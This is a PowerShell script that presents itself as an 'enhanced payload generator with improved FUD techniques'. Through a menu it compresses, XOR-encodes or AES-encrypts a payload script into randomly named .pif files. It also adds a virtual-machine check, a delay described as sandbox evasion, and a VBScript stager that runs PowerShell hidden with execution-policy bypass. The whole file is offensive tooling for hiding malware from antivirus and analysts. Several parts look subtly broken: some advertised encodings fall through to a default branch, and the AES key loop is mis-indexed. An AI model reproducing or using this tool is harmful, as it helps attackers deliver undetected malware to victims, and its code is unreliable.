# Sloppy-oppg.ps1
#
# Author : P.Hoogeveeen
# AKA    : x0xr00t
# Team   : sl0ppyroot
#
# Enhanced payload generator with improved FUD techniques

# Directory setup
$payloadDir = "C:\sl0ppy-payload"
if (-not (Test-Path $payloadDir)) {
    mkdir $payloadDir
}

function Random-String {
    param($length = 8)
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    -join ((1..$length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
}

function Show-Menu {
    param (
        [string]$Title = 'Sl0ppy-oppg'
    )
    Clear-Host
    Write-Host "================ $Title ================"
    Write-Host "1: Compression+SecureString+Output (Randomized)"
    Write-Host "2: Dubble-Compression+SecureString+Output (Randomized)"
    Write-Host "3: Tripple-Compression+SecureString+Output (AES Encrypted)"
    Write-Host "4: Compression+BXOR+Output (Anti-Debug)"
    Write-Host "5: Dubble-Compression+BXOR+Output (VM Detection)"
    Write-Host "6: Tripple-Compression+BXOR+Output (Sandbox Evasion)"
    Write-Host "7: Compression+Octal+Output (Random Filename)"
    Write-Host "8: Advanced Staged Execution (Polymorphic)"
    Write-Host "9: Compression+Whitespace+Output (Multiple Encodings)"
    Write-Host "Q: Quit"
}

function Anti-VMCheck {
    if ((Get-WmiObject -Class Win32_BIOS).SerialNumber -match "VMware|VirtualBox") {
        Write-Host "VM detected, exiting..."
        exit
    }
}

function Compress-Payload {
    param($inputFile, $outputFile)
    # Invoke-Obfuscation and multi-layer compression
    Import-Module .\Invoke-Obfuscation.psd1
    Invoke-Obfuscation -ScriptPath $inputFile -Command 'compress\1,encoding\5,encoding\5,encoding\5,out ' + $outputFile
}

function Obfuscate-And-Convert {
    param($inputFile, $outputFile, $method)
    
    # Perform different layers of obfuscation based on method
    switch ($method) {
        "BXOR" {
            # Perform a custom BXOR encoding before obfuscation
            $payload = Get-Content -Path $inputFile
            $encoded = [System.Text.Encoding]::UTF8.GetBytes($payload) -bxor 42
            [System.IO.File]::WriteAllBytes($outputFile, $encoded)
        }
        "AES" {
            # AES Encryption method (key and IV should be dynamic)
            $aes = New-Object System.Security.Cryptography.AesManaged
            $aes.Key = (New-Object Byte[] 16); (1..16) | ForEach-Object { $aes.Key[$_] = Get-Random -Maximum 256 }
            $aes.IV = (New-Object Byte[] 16); (1..16) | ForEach-Object { $aes.IV[$_] = Get-Random -Maximum 256 }
            $transform = $aes.CreateEncryptor()
            $fileBytes = [System.IO.File]::ReadAllBytes($inputFile)
            $encrypted = $transform.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)
            [System.IO.File]::WriteAllBytes($outputFile, $encrypted)
        }
        default {
            # Default compression and obfuscation
            Compress-Payload $inputFile $outputFile
        }
    }
}

do {
    Show-Menu
    $selection = Read-Host "Make a selection"
    
    switch ($selection) {
        '1' {
            $output = "$payloadDir\$(Random-String)-css-output.ps1"
            Compress-Payload "C:\sl0ppy-oppg-main\1.ps1" $output
            Obfuscate-And-Convert $output "$payloadDir\$(Random-String)-css-output.pif" "Default"
        }
        '2' {
            $output = "$payloadDir\$(Random-String)-dcss-output.ps1"
            Compress-Payload "C:\sl0ppy-oppg-main\1.ps1" $output
            Obfuscate-And-Convert $output "$payloadDir\$(Random-String)-dcss-output.pif" "Default"
        }
        '3' {
            $output = "$payloadDir\$(Random-String)-tcss-output.ps1"
            Compress-Payload "C:\sl0ppy-oppg-main\1.ps1" $output
            Obfuscate-And-Convert $output "$payloadDir\$(Random-String)-tcss-output.pif" "AES"
        }
        '4' {
            Anti-VMCheck
            $output = "$payloadDir\$(Random-String)-bc-output.ps1"
            Compress-Payload "C:\sl0ppy-oppg-main\1.ps1" $output
            Obfuscate-And-Convert $output "$payloadDir\$(Random-String)-bc-output.pif" "BXOR"
        }
        '5' {
            Anti-VMCheck
            $output = "$payloadDir\$(Random-String)-dbc-output.ps1"
            Compress-Payload "C:\sl0ppy-oppg-main\1.ps1" $output
            Obfuscate-And-Convert $output "$payloadDir\$(Random-String)-dbc-output.pif" "BXOR"
        }
        '6' {
            # Sandbox evasion by slowing down execution and adding delays
            Start-Sleep -Seconds 10
            $output = "$payloadDir\$(Random-String)-tbc-output.ps1"
            Compress-Payload "C:\sl0ppy-oppg-main\1.ps1" $output
            Obfuscate-And-Convert $output "$payloadDir\$(Random-String)-tbc-output.pif" "BXOR"
        }
        '7' {
            $output = "$payloadDir\$(Random-String)-co-output.ps1"
            Compress-Payload "C:\sl0ppy-oppg-main\1.ps1" $output
            Obfuscate-And-Convert $output "$payloadDir\$(Random-String)-co-output.pif" "Octal"
        }
        '8' {
            $output = "$payloadDir\$(Random-String)-staged-output.ps1"
            # Advanced polymorphic technique (staged execution with PowerShell and VBScript)
            $vbScript = @"
            Set objShell = WScript.CreateObject("WScript.Shell")
            objShell.Run "powershell -exec bypass -WindowStyle Hidden -Command $output", 0, false
"@
            Set-Content -Path "$payloadDir\$(Random-String)-staged.vbs" -Value $vbScript
        }
        '9' {
            $output = "$payloadDir\$(Random-String)-cw-output.ps1"
            Compress-Payload "C:\sl0ppy-oppg-main\1.ps1" $output
            Obfuscate-And-Convert $output "$payloadDir\$(Random-String)-cw-output.pif" "Whitespace"
        }
    }
} until ($selection -eq 'Q')

